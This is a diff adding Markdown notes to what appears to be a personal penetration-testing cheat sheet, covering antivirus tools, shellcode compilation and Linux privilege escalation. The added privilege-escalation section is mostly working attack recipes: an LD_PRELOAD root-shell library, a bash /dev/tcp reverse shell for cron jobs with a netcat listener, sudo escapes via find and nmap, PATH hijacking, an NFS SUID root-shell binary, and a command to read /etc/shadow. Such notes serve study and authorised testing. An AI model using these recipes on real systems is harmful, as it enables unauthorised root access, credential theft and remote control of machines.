@@ -403,3 +403,280 @@ condition: S:logout.php -> Success condition
 ```
 
 Password spraying
+
+Antivirus
+
+ClamAV: https://www.clamav.net/
+VirusTotal: https://www.virustotal.com/gui/home/upload
+Jotti VirusScan: https://virusscan.jotti.org/ (Does not share with AV companies)
+
+Signature based open source Antivirus
+
+```
+clamscan path/to/scan -> scan a folder
+sigtool --{hash algorithm} path/to/file -> generate the hash signature of a file
+clamscan -d path/to/custom/signaturedatabase path/to/scan
+
+yara database -> a file with rules in yara formats, a file is considered malware if it matches the rules in the database
+database -> a file with signatures separated by \n
+--debug -> show more information
+```
+
+Fingerpriting Antivirus and other services
+
+SharpEDRChecker: https://github.com/PwnDexter/SharpEDRChecker
+
+Analyze the contents of a file
+
+HxD application -> https://mh-nexus.de/en/hxd/
+
+PE-Bear: (Analyze windows PE strucuture)
+```
+strings path/to/file -> outputs all human readable strings
+```
+
+Compile assembly code
+
+```
+write assembly code
+nasm -f <system type (32 or 64)> path/to/code -> o
+ld path/to/o -o future/exec -> exec
+objdump -d file/to/dump -> shellcode (binary)
+objcopy -j .text -O binary <exec> <exec>.text -> text file
+xxd -i <exec>.txt -> binary in C code
+xxd -i <bin>.bin -> binary in C code
+
+in c:
+
+(*(void(*)())message)();
+```
+
+Evasion of AV
+
+Encoding & Decryption
+
+Packers
+
+ConfuserEx
+
+Binders -> Merge two programs
+
+### Privilege Escalation
+
+Having access to a system doesn't always mean that we are able to do anything we want. Most of the times, when gaining access to a system we will probably be limited to a normal user with limited privileges, only allowing us to do little to no abuse.
+
+Enters privilege escalation. The objective of this discipline is, once having access to a system, no matter what user we start in we exploit it to escalate our permissions to a more privileged user, or the admin itself if possible.
+
+By exploiting and escalating our privileges, we will be able to abuse the system better and obtain explore it more.
+
+The first step of this exploitation is exploring it's abuse vectors, covered by enumarition.
+
+#### Enumeration
+
+Consists of examaning the system with all available options we have as the user we currently have access to.
+
+<ins>Linux</ins>
+
+List of useful Linux commands:
+
+```shell
+# Get name of the machine
+hostname
+
+uname -a -> Information on the running system
+/proc/version -> Kernel information
+ps -> Process information
+ps -A -> All processes
+ps axjf -> Process tree
+/etc/issue -> System information
+env -> Enviromental variables
+sudo -l -> List of commands current user can run as sudo
+ls -la -> List all files even hidden
+id <user> -> Information on users
+/etc/passwd -> Information on users
+history -> List of recent commands
+ifconfig -> Network interface info
+ip route -> Network routes
+netstat -> Network communication info
+netstat -a (open ports)
+netstat -at (tcp) | -au (udp)
+netstat -l (listening)
+netstat -s (statistics)
+netstat -tp (service info)
+find -> filter directories and find depending on args
+grep -> filter input
+
+# Files with SUID or SGID set
+find / -type f -perm -04000 -ls 2>/dev/null
+
+# Files with capabilities
+getcap -r / 2>/dev/null
+
+# See cron jobs schedule
+/etc/crontab
+
+# See writable folders
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+# See NFS configuration
+cat /etc/exports
+showmount -e {VICTIM_ADDRESS}
+```
+
+List of useful third-party tools:
+
+- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+- LinEnum: https://github.com/rebootuser/LinEnum
+- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+- Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+Enumeration once accessed
+
+Tools
+
+- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+- LinEnum: https://github.com/rebootuser/LinEnum
+- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+- Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+#### Kernel Exploits
+
+One of the ways of escalating privileges is abusing the kernel version currently in use in the attack machine. This kernel version might have already written exploits that help us escalate privileges.
+
+To looks for these exploits we can use:
+
+- exploitDb
+- searchsploit
+
+#### Sudo Exploits
+
+Even though using sudo is pretty limited, sometimes some low lever users have access to a set of restricted privileged commands using sudo.
+
+Some of these applications might unwillingly allow us to do things we are not supposed to.
+
+For example, Apache2:
+
+```
+apache2 -f /etc/shadow -> will show us the first line of etc/shadow after failing.
+```
+
+Patrical examples:
+
+```
+# Using find
+sudo find \ -type f -name "sh" -exec {} \;
+
+# Using nmap
+sudo nmap --interactive
+```
+
+LD_PRELOAD
+
+If a user has this permission `env_keep+=LD_PRELOAD`, this allows for custom libraries to be loaded before the sudo privileged program is executed using the LD_PRELOAD option.
+
+Here is an exploit in c using this:
+
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+```
+# Compile as a library
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+# Execute the exploit
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so <privilege cmd>
+```
+
+#### SUID Exploits
+
+Sometimes in some systems, there are files with SUID owned by root. These files allow their execution with root privileges by any user. If a vulnerable file is SUID, it could be used to exploit an escalate our privileges allowing us to do whatever we want.
+
+Examples are files that allow us to run arbitary code, or that allow us to manipulate restricted files.
+
+Binaries known to be exploitable: https://gtfobins.github.io/
+
+#### Capabilities Exploits
+
+Just like SUID, capabilities allow users to get certain privileged permissions when executing commands. Unlike SUID, these permissions are more fine-grained and related to specific actions rather than the general executing a program as root.
+
+If not properly set they could still be exploited to read unauthorized files or even gain root privileges.
+
+Binaries known to be exploitable with capabilites also: https://gtfobins.github.io/
+
+#### Cron Jobs Exploits
+
+Cron jobs are scripts that are scheduled in a system to run from time to time. They normally run associated to the user who created them which means there will be scripts probably ran by root.
+
+If the ran scripts are not properly permission protected or are not defined by a full path, they could be edited to run arbitary code, or the PATH variable could be changed to redirect the script to a PATH where the user has write permission. (MORE ON PATH IN THE NEXT SECTION).
+
+Here is a reverse shell script that could be used for cron jobs:
+
+```shell
+#!/bin/bash
+
+bash -i >& /dev/tcp/{attacker-address}/{port} 0>&1
+```
+
+```
+# Attacker machine
+nc -nlvp {port}
+```
+
+#### PATH Exploits
+
+If a command is called without its full path specification, linux will look for it under the folders in the $PATH enviroment variable.
+
+If a SUID program calls for a "test" program without specification of the full path, we could manipulate the $PATH variable to look first in a malicious directory for `test` cmd.
+
+In this directory we would have a `test` script that would run a shell.
+
+Here is how we would do:
+
+```
+# Add a directory to priority in PATH
+export PATH=/tmp:$PATH
+
+# Create malicious script
+echo "/bin/bash" > test (in tmp directory)
+```
+
+### NFS Exploits
+
+Sometimes gaining privilege escalation is not only about the local machine. We could for example find a SSH private key for root user and just SSH as the root user.
+
+NFS (Network File Sharing) allows for files to be shared across devices. If the target is misconfigured (no_root_squash), which will make files be created by the owner of the directory (root if the case), NFS could allow for files to be written in this folders with root privileges and SUID, allowing for privilege escalation.
+
+```
+# Mount NFS on attacker
+mount -o rw {address}:{path} {path/in/attacker}
+```
+
+Build privilege escalation exploit
+```
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+    return 0;
+}
+```
+
+Compile it and give it SUID
+```
+# In the mounted folder
+gcc exploit.c -o exploit -w
+
+chmod +s exploit
+```
